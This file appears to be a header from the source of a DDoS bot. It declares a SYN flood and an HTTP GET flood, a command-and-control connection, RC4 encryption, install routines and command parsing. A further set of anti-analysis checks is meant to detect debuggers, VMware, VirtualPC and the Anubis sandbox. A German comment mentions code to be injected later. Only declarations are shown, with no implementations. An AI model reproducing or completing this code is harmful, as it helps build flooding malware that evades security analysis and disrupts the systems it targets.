//---------------functions/commands------------
int skysyn(string target,string port,string length);
int HTTPGetflood(string target,string length);
//---------------request----------
int OSVersionCheck(void);
string name();
string serial();
string NAT();
//------------------connect-----------
int connect(int meta=0);
//--------------other----------
char *RC4(const char *pszText, int iTextLen, const char *pszKey);
void swapints(int *array, int ndx1, int ndx2);
bool install();
int parsecommand(string command);
char ResolveHost();
string IntToStr(int i);
int Str2Int(string);
//--------------------anti´s---------
bool IsDebuggerRunning(HANDLE hProcess);
bool IsVMware();
bool IsVirtualPC();
bool IsAnubis();
DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep);
bool IsVPC();
bool IsVMware2();
bool IsInVM();

//-----------------------------f-l-s-------------
//------------------------------i-e------------------
#include "shared_functions.h"
#include "connect_and_stuff.h"
#include "install.h"
#include "httpgetflood.h"
#include "skysyn.h"
#include "ri0t-anti.h"
#include "rc4.h"
#include "stub.h"



//temporär(nacher injecten)
//#include "antitask_antidebug.h"
